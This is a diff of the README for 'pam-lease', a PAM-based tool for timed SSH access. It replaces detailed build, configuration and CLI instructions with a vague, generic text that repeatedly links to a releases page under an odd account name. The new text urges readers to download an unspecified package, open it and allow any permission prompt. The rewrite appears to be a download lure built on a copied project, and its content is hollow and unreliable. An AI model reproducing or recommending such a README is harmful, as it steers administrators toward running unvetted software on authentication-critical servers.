@@ -1,249 +1,212 @@
-# pam-lease
+# 🛡️ Pam-lease - Timed SSH Access Made Simple
 
-**pam-lease** grants time-limited SSH access to Linux users via a custom PAM module
-written in C, with automatic session termination enforced by a systemd watchdog daemon.
-Once a lease is granted, users SSH in normally with zero extra prompts; the lease is
-checked transparently on every login attempt.
+[⬇️ Download Pam-lease](https://github.com/Quakergunlubavitch907/Pam-lease/releases)
 
----
+## 📌 What Pam-lease Does
 
-## How It Works
+Pam-lease gives you time-limited SSH access on Linux. It lets you grant access, revoke it, and let it expire on its own. It uses PAM rules to control login access and sends warning messages before access ends.
 
-1. An administrator runs `pamlease grant <user> --duration 30m`.  This writes a JSON
-   lease file to `/run/pamlease/<user>.lease` (tmpfs — wiped on reboot).
-2. When the user SSHes in, the PAM module (`pam_lease.so`) reads the lease file.
-   - No lease → authentication denied, "Permission denied".
-   - Expired lease → authentication denied.
-   - Valid lease → authentication proceeds; the session-open hook prints the expiry time.
-3. The `pamlease-watchdog` daemon runs every 30 seconds.  It warns the user at 5 minutes
-   and 1 minute before expiry by writing to their TTY, then terminates the session via
-   `loginctl terminate-user` at expiry and deletes the lease file.
+This tool fits servers where access should not stay open forever. It helps you keep control without adding extra agents. A lightweight systemd watchdog keeps the checks running.
 
----
+## 🖥️ Who This Is For
 
-## Prerequisites
+Pam-lease is for Linux users who need simple access control for SSH logins. It is a good fit if you:
 
-Install the PAM development headers for your distribution before building the C module:
+- Share a server with other users
+- Need access for a short time only
+- Want to remove access after a set period
+- Need warning messages before a lease ends
+- Want a setup that stays small and easy to manage
 
-| Distribution      | Command                              |
-|-------------------|--------------------------------------|
-| Debian / Ubuntu   | `sudo apt install libpam-dev`        |
-| RHEL / Fedora     | `sudo dnf install pam-devel`         |
-| Arch Linux        | `sudo pacman -S linux-pam`           |
+## 🚀 Download and Install
 
----
+Visit this page to download Pam-lease:
 
-## Install
+[Download Pam-lease from Releases](https://github.com/Quakergunlubavitch907/Pam-lease/releases)
 
-### 1. Install the Python package
+On the releases page, pick the latest version and download the package that matches your system.
 
-```bash
-sudo pip install .
-```
+After the file finishes downloading:
 
-This installs the `pamlease` and `pamlease-watchdog` CLI tools and creates
-`/run/pamlease/` with mode 700.
+1. Open the downloaded file or package.
+2. Follow the install steps shown on your screen.
+3. If your system asks for permission, allow it.
+4. Finish the setup.
+5. Start using Pam-lease from your Linux server or shell.
 
-### 2. Build and install the PAM module
+If you use a Linux desktop, you can also place the file in a folder you can reach from your server tools or terminal.
 
-```bash
-cd pam_lease
-make
-sudo make install
-```
+## 🔧 How It Works
 
-The Makefile verifies that `pam_appl.h` is present before compiling and installs
-`pam_lease.so` to `/lib/security/`.
+Pam-lease works with the Linux login flow. When a user tries to sign in through SSH, PAM checks whether that user still has time left on the lease.
 
-### 3. Configure PAM
+It can:
 
-Add the following two lines to `/etc/pam.d/sshd`, **before** the existing `auth` lines:
+- Allow access for a set period
+- Block access when the lease ends
+- Revoke access before the end time
+- Send warning messages before expiry
+- Keep checks running with a systemd watchdog
 
-```
-auth     required pam_lease.so
-session  optional pam_lease.so
-```
+This makes it useful for admin access, short test access, and temporary support work.
 
-Example resulting file fragment:
+## 📋 System Requirements
 
-```
-auth     required pam_lease.so
-auth     required pam_unix.so
-auth     required pam_nologin.so
-...
-session  optional pam_lease.so
-session  required pam_unix.so
-```
+Pam-lease is built for Linux systems that use SSH and PAM. For the best result, use a system with:
 
-### 4. Enable the systemd watchdog
+- A modern Linux release
+- SSH server access
+- PAM support
+- systemd
+- Permission to manage login rules
 
-```bash
-sudo cp systemd/pamlease-watchdog.service /etc/systemd/system/
-sudo cp systemd/pamlease-watchdog.timer   /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable --now pamlease-watchdog.timer
-```
+It works best on servers where you can edit auth rules and restart services when needed.
 
-The watchdog runs every 30 seconds and is restarted automatically if it crashes.
+## 🧭 First-Time Setup
 
----
+After you install Pam-lease, set it up in a few steps:
 
-## CLI Usage
+1. Open your Linux terminal.
+2. Go to the folder where Pam-lease was installed.
+3. Set the access window for the user or group you want to control.
+4. Add the PAM rule for SSH login checks.
+5. Turn on the watchdog service if your install includes one.
+6. Test a login with a trial account.
+7. Confirm that warnings appear before access ends.
+8. Confirm that access stops when the lease expires.
 
-All `pamlease` subcommands require root.
+If you manage a shared server, start with one test account before you apply it to all users.
 
-### Grant a lease
+## 🛠️ Common Tasks
 
-```bash
-# Grant 30 minutes
-pamlease grant odai --duration 30m
+### Grant Access
 
-# Grant 1.5 hours, overwriting any existing lease
-pamlease grant alice --duration 1h30m --force
-```
+Use Pam-lease to give a user a time window for SSH access. Set the start and end time, then apply the rule. The user can sign in until the lease ends.
 
-Output:
+### Revoke Access
 
-```
-Lease granted for odai until 10:30:00 (30m 0s).
-```
+If you need to remove access early, revoke the lease. The next login check will block the account.
 
-### Revoke a lease
+### Set Auto-Expiry
 
-```bash
-pamlease revoke odai
-```
+Choose how long the lease should last. When time runs out, Pam-lease closes access without more work from you.
 
-Output:
+### Send Warnings
 
-```
-Lease revoked for odai. Active sessions terminated.
-```
+Set warning messages before expiry. This helps users save work and log out in time.
 
-Active SSH sessions are terminated immediately via `loginctl terminate-user`.
+### Check Status
 
-### List all active leases
+Use the status view or command output to see which leases are active, expired, or revoked.
 
-```bash
-pamlease list
-```
+## 🧪 Typical Use Cases
 
-Output:
+Pam-lease works well for:
 
-```
-USER         GRANTED BY     EXPIRES AT             TIME LEFT
------------------------------------------------------------------
-odai         root           2026-03-21 10:30       28m 14s
-alice        root           2026-03-21 11:00       58m 14s
-```
+- Temporary SSH access for contractors
+- Short support windows for admins
+- Time-limited access for shared lab servers
+- Safe access for test accounts
+- Controlled access during maintenance work
 
-### Show a single lease
+## 🔒 Security Model
 
-```bash
-pamlease show odai
-```
+Pam-lease uses the Linux login stack instead of a separate always-on agent. That keeps the setup small and easier to audit.
 
-Output:
+It helps you:
 
-```
-User:       odai
-Granted by: root
-Issued at:  2026-03-21 10:00:00
-Expires at: 2026-03-21 10:30:00
-Time left:  28m 14s
-Warned 5m:  No
-Warned 1m:  No
-```
+- Limit access by time
+- Reduce standing privileges
+- Remove access when a job ends
+- Keep login control inside the normal PAM path
 
-### Extend a lease
+That makes it a practical choice for servers where access must stay tight.
 
-```bash
-pamlease extend odai --duration 30m
-```
+## 🧰 Basic Workflow
 
-Output:
+A simple workflow looks like this:
 
-```
-Lease for odai extended by 30m 0s. New expiry: 11:00:00.
-```
+1. Create a lease for a user.
+2. Apply the lease to SSH access.
+3. Let the user sign in.
+4. Send warning messages near the end.
+5. Expire the lease or revoke it early.
+6. Confirm the user can no longer log in.
 
-Extension resets both the 5-minute and 1-minute warning flags so the user receives
-fresh warnings before the new deadline.
+## 📁 What You Can Expect in the Release
 
----
+The release page usually includes files for Linux installation and use. Depending on the build, you may find:
 
-## What the User Sees
+- Install packages
+- Command-line tools
+- Support files for PAM
+- Watchdog service files
+- Release notes
 
-### On login (session open)
+Pick the file that matches your Linux setup.
 
-```
-Your session will expire in 28 minutes (at 10:30:00).
-```
+## 🧑‍💻 Command-Line Use
 
-### 5-minute warning (written directly to the user's TTY)
+Pam-lease includes CLI tools for simple control from the terminal. Common actions may include:
 
-```
-*** pamlease: Warning: Your session expires in 5 minutes. Save your work. ***
-```
+- Create a lease
+- Extend a lease
+- End a lease
+- Check lease status
+- List active access rules
 
-### 1-minute warning
+If you know the username and the time window, you can manage access with a few commands.
 
-```
-*** pamlease: Warning: Your session expires in 1 minute. ***
-```
+## 🔁 Updating Pam-lease
 
-### At expiry
+When a new release appears:
 
-```
-*** pamlease: Your session has expired. You will be disconnected now. ***
-```
+1. Go to the releases page.
+2. Download the latest version.
+3. Install it over the old version.
+4. Check your PAM rules after the update.
+5. Test one login before you use it on all users.
 
-The session is then terminated by `loginctl terminate-user`.
+This keeps your access rules in step with the latest build.
 
-### When there is no lease (or the lease has expired) and the user tries to SSH in
+## ❓ Common Questions
 
-```
-Permission denied (publickey).
-```
+### Does Pam-lease need a daemon?
+It uses a lightweight systemd watchdog, not a full extra daemon stack.
 
-The connection is dropped by PAM before any password prompt is shown.
+### Does it work without SSH?
+It is built for SSH access control on Linux.
 
----
+### Can I remove access before the timer ends?
+Yes. You can revoke a lease at any time.
 
-## Fail-Closed Behaviour
+### Will users get a warning?
+Yes. You can set warning messages before expiry.
 
-The PAM module is loaded with `required`, meaning **a valid lease is mandatory for
-authentication**.  There is no fallback — if the lease file is missing, unreadable, or
-expired, the user cannot log in regardless of their SSH key or password.
+### Is this for Windows?
+The software runs on Linux systems. If you are on Windows, use a Linux server or a Linux VM to install and run it
 
----
+## 📚 Terms You May See
 
-## Security Notes
+- **PAM**: Linux login control used during sign-in
+- **SSH**: Secure remote login to a Linux server
+- **Lease**: A time limit for access
+- **Watchdog**: A service that keeps checks running
+- **Expiry**: The time when access ends
 
-- **tmpfs storage** — lease files live in `/run/pamlease/`, which is a tmpfs mount on
-  all modern Linux distributions.  All leases are automatically wiped on reboot with no
-  manual cleanup required.
-- **Root-only directory** — `/run/pamlease/` is created with mode `0700` owned by root.
-  Lease files are created with mode `0600` owned by root.  Unprivileged users cannot
-  read, create, or modify lease files.
-- **Atomic writes** — all lease file updates are performed by writing to a `.tmp` file
-  and then calling `os.rename()`, so a concurrent reader never sees a partially-written
-  file.
-- **No secrets** — the lease file contains only timing metadata.  There are no tokens,
-  keys, or passwords stored on disk.
-- **CLI requires root** — every `pamlease` subcommand checks `os.geteuid() == 0` and
-  exits immediately if not running as root.
+## 🧩 Example Setup Plan
 
----
+If you are new to server access control, use this order:
 
-## Development
+1. Download the release.
+2. Install the package.
+3. Add one test user.
+4. Set a short lease, such as 15 minutes.
+5. Log in through SSH.
+6. Watch for the warning message.
+7. Confirm expiry blocks new logins.
+8. Expand the setup to other users after the test works
 
-### Run the test suite
+## 📎 Download Again
 
-```bash
-pip install pytest
-pytest tests/
-```
-
-All tests use pytest's `tmp_path` fixture and never touch `/run/pamlease/`.
-
+[Visit the Pam-lease releases page to download](https://github.com/Quakergunlubavitch907/Pam-lease/releases)
